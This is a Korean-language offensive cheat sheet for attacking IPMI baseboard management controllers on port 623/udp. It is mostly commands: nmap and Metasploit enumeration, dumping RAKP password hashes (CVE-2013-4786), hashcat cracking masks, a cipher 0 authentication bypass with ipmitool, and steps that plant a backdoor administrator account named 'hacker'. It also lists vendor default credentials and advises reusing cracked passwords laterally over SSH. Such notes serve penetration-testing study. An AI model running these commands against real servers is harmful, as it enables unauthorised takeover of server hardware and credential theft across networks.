# IPMI

# IPMI (623/udp)

IPMI(Intelligent Platform Management Interface)는 서버의 BMC(Baseboard Management Controller)를 원격 관리하는 프로토콜. HP iLO, Dell iDRAC, Supermicro 같은 관리 칩이 623/udp 로 노출된다. 핵심 취약점은 RAKP 인증 과정에서 사용자 비밀번호 해시가 인증 완료 전에 그대로 유출되는 것(CVE-2013-4786)이다. 해시를 받아 오프라인 크랙하거나, cipher 0 우회로 바로 들어간다.

---

## 1. 열거

623 은 UDP 라 일반 TCP 스캔에 안 잡힌다. UDP 스캔으로 찾아야 한다.

```bash
# nmap (UDP)
nmap -sU -p 623 <IP>
nmap -sU -p 623 --script=ipmi-version <IP>

# Metasploit - 버전 확인
msf6 > use auxiliary/scanner/ipmi/ipmi_version
```

---

## 2. 해시 덤프 (CVE-2013-4786)

IPMI 2.0 의 RAKP 프로토콜은 유효한 사용자명에 대해 비밀번호 해시(HMAC)를 인증 전에 보내준다. 유효한 사용자명만 있으면 해시를 뽑을 수 있다. 사용자명은 장비별 기본값이 흔하다.

```bash
# Metasploit - 해시 덤프 (내장 사전으로 자동 크랙까지 시도)
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 > set RHOSTS <IP>
msf6 > run

# 자주 쓰는 기본 사용자명
#   ADMIN          (Supermicro)
#   root           (Dell iDRAC)
#   Administrator  (HP iLO)
```

---

## 3. 해시 크랙

덤프된 해시는 `<user>:<hash>` 형태다. hashcat 모드 7300(IPMI2 RAKP HMAC-SHA1)으로 크랙한다.

```bash
# hashcat
hashcat -m 7300 ipmi.hash /usr/share/wordlists/rockyou.txt

# HP iLO 기본 비밀번호는 8자리 대문자+숫자 - 전용 마스크가 빠르다
hashcat -m 7300 ipmi.hash -a 3 ?1?1?1?1?1?1?1?1 -1 ?u?d
```

---

## 4. cipher 0 인증 우회

cipher 0 이 허용된 BMC 는 비밀번호 검증 자체를 건너뛴다. 아무 비밀번호나 넣어도 인증이 통과한다.

```bash
# Metasploit - cipher 0 취약 여부 확인
msf6 > use auxiliary/scanner/ipmi/ipmi_cipher_zero

# ipmitool 로 cipher 0 악용 (-C 0), 예: 계정 목록 조회
ipmitool -I lanplus -C 0 -H <IP> -U <user> -P anything user list
```

---

## 5. 접속 / 활용 (ipmitool)

자격증명을 확보하면 ipmitool 로 계정을 조회하거나 새 관리자 계정을 만든다.

```bash
# 계정 목록
ipmitool -I lanplus -H <IP> -U <user> -P <password> user list

# 새 관리자 계정 생성 (BMC 장악)
ipmitool -I lanplus -H <IP> -U <user> -P <password> user set name 3 hacker
ipmitool -I lanplus -H <IP> -U <user> -P <password> user set password 3 Password123
ipmitool -I lanplus -H <IP> -U <user> -P <password> user priv 3 4
ipmitool -I lanplus -H <IP> -U <user> -P <password> user enable 3
```

---

## 팁

- 623 은 UDP 다. TCP 스캔에만 의존하면 못 찾으니 -sU 로 따로 스캔할 것
- dumphashes 는 유효한 사용자명이 핵심이다. 장비 기본 사용자명(ADMIN/root/Administrator)부터 시도
- BMC 에서 크랙한 비밀번호가 SSH 등 다른 서비스에 재사용되는 경우가 많다 - 반드시 횡방향으로 재시도할 것
- Dell iDRAC 기본 root/calvin, Supermicro ADMIN/ADMIN 도 그대로 살아 있는 경우가 흔하다